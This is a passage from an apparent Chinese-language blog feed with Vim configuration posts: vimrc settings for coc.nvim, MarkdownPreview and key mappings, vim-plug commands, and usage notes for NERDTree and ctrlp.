class="string">&#x27;\s&#x27;</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"><span class="comment">&quot; 使用&lt;cr&gt;确认完成，`&lt;C-g&gt; u`表示在当前位置断开撤销链</span></span><br><span class="line"><span class="comment">&quot; Coc仅在确认时执行片段和其他编辑</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;cr&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-y&gt;&quot;</span> : <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="comment">&quot; 使用K在预览窗口中显示文档</span></span><br><span class="line"><span class="keyword">nnoremap</span> ? :<span class="keyword">call</span> <span class="symbol">&lt;SID&gt;</span>show_documentation()<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">show_documentation</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">index</span>([<span class="string">&#x27;vim&#x27;</span>,<span class="string">&#x27;help&#x27;</span>], &amp;<span class="keyword">filetype</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">execute</span> <span class="string">&#x27;h &#x27;</span>.<span class="built_in">expand</span>(<span class="string">&#x27;&lt;cword&gt;&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">call</span> CocAction(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 突出显示CursorHold上光标下的符号</span></span><br><span class="line"><span class="keyword">autocmd</span> CursorHold * <span class="keyword">silent</span> <span class="keyword">call</span> CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==自定义补全==</span></span><br><span class="line"><span class="comment">&quot;=html自动补全标签=</span></span><br><span class="line"><span class="keyword">autocmd</span> BufNewFile *  <span class="keyword">setlocal</span> <span class="keyword">filetype</span>=html</span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">InsertHtmlTag</span><span class="params">()</span></span></span><br><span class="line">	<span class="keyword">let</span> pat = <span class="string">&#x27;\c&lt;\w\+\s*\(\s\+\w\+\s*=\s*[&#x27;</span><span class="string">&#x27;#$;,().&quot;a-z0-9]\+\)*\s*&gt;&#x27;</span></span><br><span class="line">	normal! <span class="keyword">a</span>&gt;</span><br><span class="line">	<span class="keyword">let</span> save_cursor = <span class="built_in">getpos</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">	<span class="keyword">let</span> result = <span class="built_in">matchstr</span>(<span class="built_in">getline</span>(save_cursor[<span class="number">1</span>]), pat)</span><br><span class="line">	<span class="comment">&quot;if (search(pat, &#x27;b&#x27;, save_cursor[1]) &amp;&amp; searchpair(&#x27;&lt;&#x27;,&#x27;&#x27;,&#x27;&gt;&#x27;,&#x27;bn&#x27;,0,  getline(&#x27;.&#x27;)) &gt; 0)</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">search</span>(pat, <span class="string">&#x27;b&#x27;</span>, save_cursor[<span class="number">1</span>]))</span><br><span class="line">		normal! lyiwf&gt;</span><br><span class="line">		normal! <span class="keyword">a</span>&lt;/</span><br><span class="line">		normal! <span class="keyword">p</span></span><br><span class="line">		normal! <span class="keyword">a</span>&gt;</span><br><span class="line">	<span class="keyword">endif</span></span><br><span class="line">	:<span class="keyword">call</span> <span class="built_in">cursor</span>(save_cursor[<span class="number">1</span>], save_cursor[<span class="number">2</span>], save_cursor[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===历史===</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:undotree_DiffAutoOpen</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> :UndotreeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===文本===</span></span><br><span class="line"><span class="comment">&quot;==过滤对齐工具==</span></span><br><span class="line"><span class="comment">&quot;使用 :Tabularize /|	使文本向 | 对齐,可是其他符号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==快速选中==</span></span><br><span class="line"><span class="string">&quot;视图模式下，使用 i&#x27; 快速选中 &#x27;&#x27; 中的内容，其他: i&quot;</span> i) i] i&#125; ip</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==快速注释==</span></span><br><span class="line"><span class="comment">&quot;输入 &lt;space&gt;cc 对该行注释</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===markdon===</span></span><br><span class="line"><span class="comment">&quot;==MarkdownPreview配置==</span></span><br><span class="line"><span class="comment">&quot; 设置为1，nvim将在进入降价缓冲区后打开预览窗口,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_start</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，当从降价缓冲区转换到另一个缓冲区时，nvim将自动关闭当前预览窗口,默认1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_close</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1时，vim将在保存缓冲区时刷新markdown或从插入模式退出，默认0为自动刷新markdown，因为您编辑或移动光标,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_refresh_slow</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，MarkdownPreview命令可用于所有文件，默认情况下可用于markdown文件,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_command_for_global</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，默认情况下预览服务器可供网络中的其他人使用，服务器侦听localhost（127.0.0.1,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_to_the_world</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 当您在远程vim中工作并在本地浏览器上预览时，使用自定义IP打开预览页面非常有用。详细信息请参阅:https://github.com/iamcco/markdown-preview.nvim/pull/9,默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_ip</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 指定浏览器打开预览页面，默认：&#x27;&#x27;,firefox浏览器快熟关闭窗口需要设置：</span></span><br><span class="line"><span class="comment">&quot; about:config &gt; dom.allow_scripts_to_close_windows 将值设置为 true</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browser</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，打开预览页面时，在命令行中回显预览页面url，默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_echo_preview_url</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 自定义vim函数名称打开预览页面此函数将接收url作为param，默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browserfunc</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; markdown渲染选项</span></span><br><span class="line"><span class="comment">&quot; mkit: markdown-it选项</span></span><br><span class="line"><span class="comment">&quot; katex: katex选项</span></span><br><span class="line"><span class="comment">&quot; uml: markdown-it-plantuml选项</span></span><br><span class="line"><span class="comment">&quot; maid: mermaid选项</span></span><br><span class="line"><span class="comment">&quot; disable_sync_scroll: 禁用同步滚动，默认0</span></span><br><span class="line"><span class="comment">&quot; sync_scroll_type: &#x27;middle&#x27;, &#x27;top&#x27; or &#x27;relative&#x27;, default value is &#x27;middle&#x27;</span></span><br><span class="line"><span class="comment">&quot;   middle: 表示光标位置总是显示在预览页面的中间</span></span><br><span class="line"><span class="comment">&quot;   top: 表示预览页面顶部的vim顶部视口总是显示</span></span><br><span class="line"><span class="comment">&quot;   relative: 表示光标位置总是显示在预览页面的相对位置</span></span><br><span class="line"><span class="comment">&quot; hide_yaml_meta: 隐藏yaml元数据，默认1</span></span><br><span class="line"><span class="comment">&quot; sequence_diagrams: js-sequence-diagrams 选项</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_preview_options</span> = &#123;</span><br><span class="line">    \ <span class="string">&#x27;mkit&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;katex&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;uml&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;maid&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;disable_sync_scroll&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    \ <span class="string">&#x27;sync_scroll_type&#x27;</span>: <span class="string">&#x27;middle&#x27;</span>,</span><br><span class="line">    \ <span class="string">&#x27;hide_yaml_meta&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    \ <span class="string">&#x27;sequence_diagrams&#x27;</span>: &#123;&#125;</span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义markdown样式必须是绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_markdown_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义高亮样式必须绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_highlight_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义端口启动服务器或使用随机空白</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_port</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 预览页面标题，$ &#123;name&#125;将替换为文件名</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_page_title</span> = <span class="string">&#x27;「$&#123;name&#125;」&#x27;</span></span><br><span class="line">|</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F8&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreview</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F9&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewStop</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;LEADER&gt;</span>mt <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewToggle</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==表格制作工具==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">tm</span> :TableModeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===其他===</span></span><br><span class="line"><span class="comment">&quot;==中文帮组==</span></span><br><span class="line"><span class="keyword">set</span> helplang=<span class="keyword">cn</span>		<span class="comment">&quot; 启用英文的为en</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==显示按键绑定==</span></span><br><span class="line"><span class="comment">&quot;nnoremap &lt;silent&gt; &lt;leader&gt; :WhichKey &#x27;&lt;Space&gt;&#x27;&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=====END=====</span></span><br><span class="line"><span class="comment">&quot;===插件配置===</span></span><br><span class="line"><span class="comment">&quot;=============</span></span><br></pre></td></tr></table></figure>
<h3 id="plug插件管理器相关命令"><a href="#plug插件管理器相关命令" class="headerlink" title="plug插件管理器相关命令"></a>plug插件管理器相关命令</h3><p><strong>安装插件</strong></p>
<p>在<code>vimrc</code>中添加需要的插件<code>plug</code>内容，重载<code>vimrc</code>，使用命令进行安装</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugInstall</span><br></pre></td></tr></table></figure>
<p><strong>检查状态</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugStatus</span><br></pre></td></tr></table></figure>
<p><strong>更新插件</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugUpdate</span><br></pre></td></tr></table></figure>
<p><strong>更新plug插件管理器</strong></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugUpgrade</span><br></pre></td></tr></table></figure>
<p><strong>删除插件</strong></p>
<p>将<code>vimrc</code>中的<code>plug</code>内容删除，重载<code>vimrc</code>，使用命令进行删除</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">PlugClean</span><br></pre></td></tr></table></figure>
<p><strong>审查插件</strong></p>
<p>更新的插件可能会有新bug，需要滚回插件版本，使用该命令可查看上次<code>PlugUpdate</code>的更，在段落上按<code>X</code>将插件滚回到更新前的状态</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:PlugDiff</span><br></pre></td></tr></table></figure>
<h3 id="插件的使用"><a href="#插件的使用" class="headerlink" title="插件的使用"></a>插件的使用</h3><p><strong>NERD Tree 目录树</strong></p>
<p>通过设置的映射按键（<code>F3</code>）启用或禁用<code>NERD Tree</code></p>
<p><code>NERD Tree</code>提供一些常用快捷键来操作目录:</p>
<ul>
<li>通过 <code>h、j、k、l</code> 来移动光标</li>
<li><code>o</code> 打开关闭文件或目录，如果想打开文件，必须光标移动到文件名</li>
<li><code>t</code> 在标签页中打开</li>
<li><code>s</code> 和 <code>i</code> 可以水平或纵向分割窗口打开文件</li>
<li><code>p</code> 到上层目录</li>
<li><code>P</code> 到根目录</li>
<li><code>K</code> 到同目录第一个节点</li>
<li><code>P</code> 到同目录最后一个节点</li>
</ul>
<h5 id="YouCompleteMe-amp-syntastic"><a href="#YouCompleteMe-amp-syntastic" class="headerlink" title="YouCompleteMe &amp; syntastic"></a>YouCompleteMe &amp; syntastic</h5><p>在输入时敲入相关代码，就会自动提示代码列表，选择后按<code>`tab</code>键即可补全</p>
<p><code>YouCompleteMe</code>已经集成了<a href="https://github.com/scrooloose/syntastic">Syntastic</a>，所以出现代码语法错误，就会有红色错误提示</p>
<p><strong>ctrlp</strong></p>
<p>启用ctrlp</p>
<ul>
<li>运行命令<code>:CtrlP</code>或<code>:CtrlP [starting-directory]</code>来以查找文件模式来启用<strong>ctrlp</strong></li>
<li>运行命令<code>:CtrlPBuffer</code>或<code>:CtrlPMRU</code>来以查找缓冲或最近打开文件模式来启用<strong>ctrlp</strong></li>
<li>运行命令<code>CtrlPMixed</code>来查找文件、查找缓冲和最近打开文件混合模式来启动<strong>ctrlp</strong></li>
</ul>
<p>基本使用</p>
<ul>
<li>按<code>&lt;c-f&gt;</code>和<code>&lt;c-b&gt;</code>在三种查找模式中互相切换</li>
<li>按<code>&lt;c-y&gt;</code>来创建新文件和对应的父目录</li>
<li>按<code>&lt;c-d&gt;</code>来切换到只查找文件名而不是全路径</li>
<li>按<code>&lt;c-j&gt;</code>，<code>&lt;c-k&gt;</code>或箭头方向键来移动查找结果列表</li>
<li>按<code>&lt;c-t&gt;</code>或<code>&lt;c-v&gt;</code>，<code>&lt;c-x&gt;</code>来以新标签或分割窗口的方式来打开文件</li>
<li>按<code>&lt;c-z&gt;</code>来标识或取消标识文件，然后按<code>&lt;c-o&gt;</code>来打开文件</li>
<li>按<code>&lt;c-n&gt;</code>，<code>&lt;c-p&gt;</code>来在提示历史中选择下一个/上一个字符串</li>
</ul>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>vim美化</title>
    <url>/posts/c836977e/</url>
    <content><![CDATA[<h1 id="vim-自带教程"><a href="#vim-自带教程" class="headerlink" title="vim 自带教程"></a>vim 自带教程</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vimtutor</span><br></pre></td></tr></table></figure>
<h1 id="vim-配置美化"><a href="#vim-配置美化" class="headerlink" title="vim 配置美化"></a>vim 配置美化</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vim/vimrc	<span class="comment">#创建自己的vim配置</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;                               _ ____   __     _____ __  __ ____   ____</span></span><br><span class="line"><span class="comment">&quot;   ___  ___  _ __  _   _ _ __ ( ) ___|  \ \   / /_ _|  \/  |  _ \ / ___|</span></span><br><span class="line"><span class="comment">&quot;  / _ \/ _ \| &#x27;_ \| | | | &#x27;_ \|/\___ \   \ \ / / | || |\/| | |_) | |</span></span><br><span class="line"><span class="comment">&quot; |  __/ (_) | | | | |_| | | | |  ___) |   \ V /  | || |  | |  _ &lt;| |___</span></span><br><span class="line"><span class="comment">&quot;  \___|\___/|_| |_|\__,_|_| |_| |____/     \_/  |___|_|  |_|_| \_\\____|</span></span><br><span class="line"><span class="comment">&quot; ===============================木He寸&amp;eonun===============================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; i 写入模式、i插入之前、I行首插入、a插入之后、A行尾插入、o下行插入、O上行插入、x 删除光标后一个字符</span></span><br><span class="line"><span class="comment">&quot; &lt;Operation(操作)&gt; &lt;Motion(动作)&gt;</span></span><br><span class="line"><span class="comment">&quot; d 剪切操作(剪切可看做删除), y 复制操作, p 粘贴操作， c 剪切后修改操作</span></span><br><span class="line"><span class="comment">&quot; ← 左动作， → 右动作， 3← 3个左动作， b 选择光标开启到上一个词后的内容， i 指明光标在词中，当前词待操作， w 选择光标开始到下个词前的内容， iw 在当前词之间选择该， y3← 向右复制， f 查找动作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 文件类型检测</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="keyword">on</span></span><br><span class="line"><span class="keyword">filetype</span> plugin <span class="built_in">indent</span> <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 开启语法高亮</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&quot;g:syntax_on&quot;</span>)</span><br><span class="line">    <span class="keyword">syntax</span> enable</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 保存vimrc时立即重新加载生效</span></span><br><span class="line"><span class="keyword">autocmd</span> BufWritePost $MYVIMRC <span class="keyword">source</span> $MYVIMRC	</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; txt文件按照wiki语法高亮</span></span><br><span class="line"><span class="keyword">autocmd</span> BufNewFile *.txt <span class="keyword">set</span> ft=confluencewiki </span><br><span class="line"><span class="keyword">autocmd</span> BufEnter *.txt <span class="keyword">set</span> ft=confluencewiki</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 恢复上次文件打开位置</span></span><br><span class="line"><span class="keyword">au</span> BufReadPost * <span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &gt; <span class="number">0</span>|<span class="keyword">if</span> <span class="built_in">line</span>(<span class="string">&quot;&#x27;\&quot;&quot;</span>) &lt;= <span class="built_in">line</span>(<span class="string">&quot;$&quot;</span>)|<span class="keyword">exe</span>(<span class="string">&quot;norm &#x27;\&quot;&quot;</span>)|<span class="keyword">else</span>|<span class="keyword">exe</span> <span class="string">&quot;norm $&quot;</span>|<span class="keyword">endif</span>|<span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 打开时运行指令 取消上回搜索内容的高亮</span></span><br><span class="line">exec <span class="string">&quot;nohlsearch&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=========</span></span><br><span class="line"><span class="comment">&quot;===Let===</span></span><br><span class="line"><span class="comment">&quot;==START==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 将leader键（\键,类似于Windows键）换成空格（相当于空格键）</span></span><br><span class="line"><span class="keyword">let</span> mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="comment">&quot; 矫正部分配色</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_ut=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 不同模式下的光标样式</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=1\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SR = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=2\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_EI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=0\x7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===END===</span></span><br><span class="line"><span class="comment">&quot;===let===</span></span><br><span class="line"><span class="comment">&quot;=========</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=========</span></span><br><span class="line"><span class="comment">&quot;===set===</span></span><br><span class="line"><span class="comment">&quot;==START==</span></span><br><span class="line"><span class="keyword">set</span> nocompatible		<span class="comment">&quot; 不兼容 VI ,compatible为兼容(tab将不会变成空格)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> fileencodings=utf-<span class="number">8</span>,gbk	<span class="comment">&quot; 写入文件时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> termencoding=utf-<span class="number">8</span>		<span class="comment">&quot; 输出到终端时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> encoding=utf-<span class="number">8</span>			<span class="comment">&quot; 缓存的文本、寄存器、Vim 脚本文件等</span></span><br><span class="line"><span class="keyword">set</span> guifont=YaHei\ Consolas\ Hybrid\ <span class="number">11.5</span>	<span class="comment">&quot; 设置显示字体为YaHei Consolas Hybrid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">number</span>			<span class="comment">&quot; 显示行号	缩写： nu</span></span><br><span class="line"><span class="keyword">set</span> relativenumber	<span class="comment">&quot; 从当前行向前向后算行数</span></span><br><span class="line"><span class="keyword">set</span> cursorline		<span class="comment">&quot; 突出显示当前行	缩写： cul</span></span><br><span class="line"><span class="string">&quot;set cursorcolumn	&quot;</span> 突出显示当前列	缩写： cuc</span><br><span class="line"><span class="keyword">set</span> showmatch		<span class="comment">&quot; 显示括号匹配</span></span><br><span class="line"><span class="keyword">set</span> showcmd			<span class="comment">&quot; 显示指令</span></span><br><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span>	<span class="comment">&quot; 显示状态栏</span></span><br><span class="line"><span class="keyword">set</span> ruler			<span class="comment">&quot; 显示光标当前位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wrap			<span class="comment">&quot; 自动换行</span></span><br><span class="line"><span class="keyword">set</span> tw=<span class="number">0</span>			<span class="comment">&quot; 防止自动分割行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> expandtab		<span class="comment">&quot; 将制表符扩展为空格</span></span><br><span class="line"><span class="keyword">set</span> softtabstop=<span class="number">4</span>	<span class="comment">&quot; 把连续数量的空格视为一个制表符</span></span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span>		<span class="comment">&quot; 制表符长度为4空格	缩写：ts</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span>	<span class="comment">&quot; 自动缩进长度为4空格</span></span><br><span class="line"><span class="keyword">set</span> autoindent		<span class="comment">&quot; 自动缩进 缩写:ai</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">cindent</span>			<span class="comment">&quot; c格式自动缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent		<span class="comment">&quot; 开启智能对其</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 基于缩进或语法进行代码折叠 indent（基于缩进）、syntax(基于语法) </span></span><br><span class="line"><span class="comment">&quot; set foldmethod=indent</span></span><br><span class="line"><span class="keyword">set</span> foldmethod=<span class="keyword">syntax</span></span><br><span class="line"><span class="comment">&quot; 启动 vim 时关闭折叠代码</span></span><br><span class="line"><span class="keyword">set</span> nofoldenable</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wildmenu		<span class="comment">&quot; 命令补全</span></span><br><span class="line"><span class="keyword">set</span> autochdir       <span class="comment">&quot; 在当前目录下执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> hlsearch		<span class="comment">&quot; 高亮显示搜索</span></span><br><span class="line"><span class="keyword">set</span> incsearch		<span class="string">&quot; 动态高亮搜索&quot;</span></span><br><span class="line"><span class="keyword">set</span> ignorecase		<span class="comment">&quot; 不区分大小写搜索</span></span><br><span class="line"><span class="keyword">set</span> smartcase		<span class="comment">&quot; 智能大小写搜索</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> mouse=<span class="keyword">a</span>			<span class="comment">&quot; 使用鼠标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> backspace=<span class="built_in">indent</span>,eol,start	<span class="comment">&quot; 能退格到行尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===END===</span></span><br><span class="line"><span class="comment">&quot;===set===</span></span><br><span class="line"><span class="comment">&quot;=========</span></span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;=============</span></span><br><span class="line"><span class="comment">&quot;===键盘映射===</span></span><br><span class="line"><span class="comment">&quot;====START====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; map		在普通、可视、运算符模式下生效</span></span><br><span class="line"><span class="comment">&quot; map!		在插入、命令模式下生效</span></span><br><span class="line"><span class="comment">&quot; 键映射map，有五种前缀，对应着vim中的五种模式：</span></span><br><span class="line"><span class="comment">&quot; nore前缀：	非递归</span></span><br><span class="line"><span class="comment">&quot; n前缀：		在普通模式下生效</span></span><br><span class="line"><span class="comment">&quot; v前缀：		在可视模式下生效</span></span><br><span class="line"><span class="comment">&quot; o前缀：		在运算符模式下生效</span></span><br><span class="line"><span class="comment">&quot; i前缀：		在插入模式下生效 </span></span><br><span class="line"><span class="comment">&quot; c前缀：		在命令模式下生效</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===一些键表===</span></span><br><span class="line"><span class="comment">&quot; 因为某些原因，ALT几乎无法映射，同时CTRL键被linux系统频繁使用，F1到F12功能键某些也被vim占用，这些都不适合用来映射，以免造成快捷键冲突，在定义快捷键时为了避免一些冲突可用&lt;LEADER&gt;前缀键配合使用</span></span><br><span class="line"><span class="comment">&quot; &lt;k0&gt;-&lt;k9&gt;		小键盘数字0到9</span></span><br><span class="line"><span class="comment">&quot; &lt;S-x&gt;			大写S配合x，意味着shift+x组合键</span></span><br><span class="line"><span class="comment">&quot; &lt;C-x&gt;			大写C配合x，意味着ctrl+x组合键</span></span><br><span class="line"><span class="comment">&quot; &lt;A-x&gt;			大写A配合x，意味着alt+x组合键</span></span><br><span class="line"><span class="comment">&quot; &lt;ESC&gt;			ESC键</span></span><br><span class="line"><span class="comment">&quot; &lt;BS&gt;			backspace退格键</span></span><br><span class="line"><span class="comment">&quot; &lt;CR&gt;			ENTER回车键</span></span><br><span class="line"><span class="comment">&quot; &lt;Space&gt;		空格键</span></span><br><span class="line"><span class="comment">&quot; &lt;Shift&gt;		shift键</span></span><br><span class="line"><span class="comment">&quot; &lt;Ctrl&gt;		ctrl键</span></span><br><span class="line"><span class="comment">&quot; &lt;Alt&gt;			alt键</span></span><br><span class="line"><span class="comment">&quot; &lt;F1&gt;-&lt;F12&gt;	F1到F12功能键</span></span><br><span class="line"><span class="comment">&quot; &lt;LEADER&gt;		vim前缀键，类似于Windows键/command (⌘) 键</span></span><br><span class="line"><span class="comment">&quot; &lt;silent&gt;		命令不显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; map 递归映射  a映射到c</span></span><br><span class="line"><span class="comment">&quot; map a b</span></span><br><span class="line"><span class="comment">&quot; map b c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; nmap 普通模式下的递归映射&quot;</span></span><br><span class="line"><span class="comment">&quot; unmap 取消 map 的映射</span></span><br><span class="line"><span class="comment">&quot; mapclear 取消所有 map 的映射</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; noremap 不递归映射  a映射为b b映射为c 两个映射互不影响</span></span><br><span class="line"><span class="comment">&quot; noremap a b</span></span><br><span class="line"><span class="comment">&quot; noremap b c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;noremap a b	&quot;</span> 将 <span class="keyword">a</span> 映射为 <span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap A 5b	&quot;</span> 将 A 映射为 <span class="number">5</span><span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap = nzz	&quot;</span> 将 n 映射 =zz 	<span class="comment">&quot; 用 zz 将该行变成中心点</span></span><br><span class="line"><span class="string">&quot;noremap - Nzz	&quot;</span> 将 <span class="keyword">N</span> 映射 -zz</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;--------------------------------------------------------------------------&quot;</span></span><br><span class="line"></span><br><span 